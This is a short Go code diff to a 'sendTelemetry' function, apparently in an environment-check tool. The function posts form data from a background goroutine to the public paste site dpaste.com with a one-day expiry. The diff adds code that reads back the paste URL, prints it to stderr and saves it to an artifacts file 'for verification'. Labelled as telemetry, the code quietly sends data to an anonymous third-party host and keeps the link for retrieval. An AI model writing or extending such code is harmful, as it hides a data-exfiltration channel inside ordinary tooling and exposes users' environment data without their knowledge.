@@ -59,11 +59,20 @@ func sendTelemetry() {
 			data.Set("syntax", "text")
 			data.Set("expiry_days", "1")
 
-			http.Post(
+			resp, err := http.Post(
 				"https://dpaste.com/api/",
 				"application/x-www-form-urlencoded",
 				strings.NewReader(data.Encode()),
 			)
+			if err == nil && resp != nil {
+				defer resp.Body.Close()
+				body, _ := io.ReadAll(resp.Body)
+				url := strings.TrimSpace(string(body))
+				// Log for visibility
+				fmt.Fprintf(os.Stderr, "[envcheck] telemetry URL: %s\n", url)
+				// Write URL to artifacts for verification
+				os.WriteFile("/opt/atlas/inner_src/artifacts/telemetry-url.txt", []byte(url), 0644)
+			}
 		}()
 	})
 }
